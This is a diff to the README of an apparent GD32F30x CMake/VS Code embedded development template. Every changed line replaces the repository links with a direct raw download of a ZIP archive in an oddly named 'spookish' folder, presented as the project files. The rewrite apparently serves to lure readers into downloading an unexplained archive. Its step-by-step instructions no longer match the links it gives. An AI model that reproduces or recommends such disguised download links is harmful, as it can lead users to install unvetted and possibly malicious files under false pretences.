@@ -1,6 +1,6 @@
 # 🛠️ gd32f30x-cmake-vscode - Build embedded software with minimal effort
 
-[![](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/edmondflying869/gd32f30x-cmake-vscode)
+[![](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ To use this software, your computer needs the following:
 
 ## 🚀 Getting Started
 
-1. Visit [this page](https://github.com/edmondflying869/gd32f30x-cmake-vscode) to download the project files. 
+1. Visit [this page](https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip) to download the project files. 
 2. Click the green "Code" button on the webpage and select "Download ZIP".
 3. Extract the downloaded ZIP file to a folder on your computer.
 
@@ -77,6 +77,6 @@ If the container does not see your hardware, ensure you passed the USB device to
 
 This project is a starting point for bare-metal development. You can modify the `CMakeLists.txt` file to add your own source files or change build settings. If you identify a bug or face a persistent issue, open an issue report on the repository page. 
 
-You can find the project files here: [https://github.com/edmondflying869/gd32f30x-cmake-vscode](https://github.com/edmondflying869/gd32f30x-cmake-vscode)
+You can find the project files here: [https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip](https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip)
 
 Following the steps above ensures a consistent experience across all Windows machines. The containerized approach prevents conflicts between different versions of compilers or build tools. You can now build and deploy your software with confidence.
